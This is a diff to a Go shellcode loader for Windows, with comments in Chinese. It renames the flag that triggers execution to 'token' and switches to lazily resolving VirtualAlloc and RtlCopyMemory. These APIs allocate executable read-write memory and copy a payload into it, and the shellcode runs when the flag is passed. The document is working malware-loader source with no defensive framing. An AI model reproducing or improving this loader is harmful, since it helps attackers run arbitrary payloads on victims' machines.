@@ -21,13 +21,13 @@ const (
 )
 
 var (
-	//如果存在fuck参数就执行shellcode
-	fuck bool
+	//如果存在token参数就执行shellcode
+	token bool
 
-	kernel32      = syscall.MustLoadDLL("kernel32.dll")
-	ntdll         = syscall.MustLoadDLL("ntdll.dll")
-	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
-	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
+	//kernel32      = syscall.MustLoadDLL("kernel32.dll")
+	//ntdll         = syscall.MustLoadDLL("ntdll.dll")
+	//VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
+	//RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
 )
 
 func checkErr(err error) {
@@ -88,6 +88,10 @@ func PKCS5UnPadding(origData []byte) []byte {
 }
 
 func runCode(code []byte) {
+	// add
+	VirtualAlloc := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc")
+	RtlCopyMemory := syscall.NewLazyDLL("ntdll.dll").NewProc("RtlCopyMemory")
+
 	//调用VirtualAlloc为shellcode申请一块内存
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
@@ -127,10 +131,10 @@ func main() {
 
 	//fmt.Println(hex.EncodeToString(shell))
 	//fmt.Println(len(os.Args))
-	//loader.exe -fuck
-	flag.BoolVar(&fuck, "fuck", false, "run shellcode")
+	//loader.exe -token
+	flag.BoolVar(&token, "token", false, "run shellcode")
 	flag.Parse()
-	if fuck {
+	if token {
 		runCode(shell)
 	}
 
